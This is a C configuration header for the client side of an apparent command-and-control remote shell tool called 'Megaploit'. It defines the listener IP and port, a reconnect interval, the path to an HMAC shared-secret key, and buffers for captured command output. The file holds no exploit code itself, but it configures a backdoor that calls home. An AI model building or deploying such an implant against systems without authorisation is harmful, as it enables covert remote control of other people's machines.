/*
 * client/config.h  –  Client-side connection configuration
 * ==========================================================
 * All tuneable values for the remote shell client live here.
 * Change these before building; do not scatter magic numbers
 * across source files.
 */

#pragma once
#ifndef CLIENT_CONFIG_H
#define CLIENT_CONFIG_H

/* ── C2 server address ────────────────────────────────────────────────────── */
#define C2_IP      "192.168.1.226"  /* IPv4 address of the Megaploit listener  */
#define C2_PORT    50005            /* TCP port the listener binds to          */

/* ── Reconnect timing ───────────────────────────────────────────────────── */
/* How many seconds to wait between connection attempts.
 * Matches RECONNECT_DELAY in megaploit/core/config.py                       */
#define RECONNECT_DELAY_SEC   10

/* ── Shared secret key ───────────────────────────────────────────────────── */
/* Path to the 32-byte raw binary key file used for HMAC-SHA256 auth.
 * Generate with:
 *   python -c "import os; open('secret.key','wb').write(os.urandom(32))"
 * The same key must be loaded by the Megaploit server.                       */
#define SECRET_KEY_PATH  "secret.key"
#define SECRET_KEY_LEN   32         /* bytes — must match server expectation  */

/* ── Response buffer sizes ───────────────────────────────────────────────── */
#define SHELL_LINE_BUF    1024      /* single fgets() line from _popen        */
#define SHELL_RESP_BUF   18384      /* accumulated command output             */

#endif /* CLIENT_CONFIG_H */
